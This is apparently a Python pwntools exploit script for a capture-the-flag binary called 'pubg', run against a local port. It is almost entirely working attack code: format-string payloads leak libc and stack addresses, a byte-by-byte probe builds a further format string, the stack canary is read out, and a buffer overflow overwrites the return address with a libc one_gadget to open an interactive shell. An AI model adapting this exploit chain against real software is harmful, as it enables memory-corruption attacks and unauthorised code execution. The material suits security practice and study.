from pwn import *
def cmd(c):
	p.readuntil("> ")
	p.sendline(str(c))
def airdrop(c):
	cmd(2)
	p.readuntil("position:")
	p.send(c)

#context.log_level="debug"
p=process("./pubg")
p=remote("127.0.0.1",1025)
cmd(1)
cmd(1)
airdrop("%p%p%p%p\n")
p.readuntil("0x25")
base=int(p.readline(),16)-0x5cd700+0x7fd980588000-0x7fd98058d000
log.warning("Libc:%s",hex(base))
airdrop("%a%a%a%a%a")
p.readuntil("ap-10220x0.0")
stack=int("0x"+p.read(11)+"0",16)
log.info("stack:%s",hex(stack))


res=""
for x in range(3):
	for y in range(1,256):
		if (chr(y)!='n' and chr(y)!='$' and chr(y)!='*' and chr(y)!='|'):

			airdrop(res+"{}%p|%p\n".format(chr(y).ljust(3-x,'\x01')))
			p.readuntil("|")
			data=p.readline()
			if data=="(nil)\n":
				data=0
			else :
				data=int(data,16)
			if (data==x+1):
				res+=chr(y)
				break
			else:
				continue
airdrop(res)
cmd(1)
p.readuntil("chicken:\n")
canary_add=(0x7ffe2c5822c8-0x7ffe2c5823d0)+stack

p.sendline(str(canary_add+1))
sleep(0.1)
p.readuntil("The ")
data="\x00"+p.read(7)
canary=u64(data.ljust(8,'\x00'))
log.info("Cnary:%s",hex(canary))
p.readuntil("~\n")
off=0x20
one=base+0x45216
p.send("\x00"*off+p64(canary)*3+p64(one)+"\n")
p.interactive()

